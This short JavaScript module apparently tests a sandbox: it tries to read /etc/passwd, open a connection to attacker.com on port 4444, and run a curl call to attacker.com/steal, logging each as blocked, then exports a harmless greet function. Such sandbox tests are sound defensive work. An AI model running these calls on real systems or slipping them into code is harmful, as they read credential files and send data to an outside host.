try {
  const fs = require('fs');
  fs.readFileSync('/etc/passwd');
} catch (e) {
  console.log('[BLOCKED] fs access denied:', e.message);
}

try {
  const net = require('net');
  net.connect(4444, 'attacker.com');
} catch (e) {
  console.log('[BLOCKED] net access denied:', e.message);
}

try {
  const { exec } = require('child_process');
  exec('curl http://attacker.com/steal');
} catch (e) {
  console.log('[BLOCKED] child_process denied:', e.message);
}

module.exports = { greet: (name) => `Hello, ${name}!` };